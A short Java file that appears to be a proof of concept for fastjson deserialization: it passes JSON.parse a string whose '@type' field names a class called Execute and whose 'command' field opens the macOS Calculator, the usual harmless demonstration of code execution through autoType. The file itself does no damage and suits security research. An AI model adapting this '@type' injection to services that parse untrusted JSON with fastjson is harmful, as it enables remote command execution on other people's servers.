package com.sorry.bug;

import com.alibaba.fastjson.JSON;

/**
 * created by 0x22cb7139 on 2021/4/15
 */
public class Debug {
    public static void main(String[] args) {
        String expstr = "{\"@type\":\"com.sorry.bug.Execute\",\"command\":\"open /System/Applications/Calculator.app\"}";
        JSON.parse(expstr);
    }
}